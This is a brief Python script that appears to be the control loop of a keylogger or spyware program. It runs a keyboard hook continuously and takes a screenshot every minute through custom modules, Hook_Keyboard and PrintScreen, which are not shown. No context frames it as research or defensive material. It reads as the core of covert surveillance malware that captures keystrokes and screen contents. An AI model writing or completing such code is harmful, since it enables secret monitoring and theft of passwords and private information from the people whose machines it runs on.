import Hook_Keyboard
import PrintScreen
import schedule


schedule.every(1).minutes.do(PrintScreen.take_screen)
while True:
    Hook_Keyboard.hook_keyboard()
    schedule.run_pending()



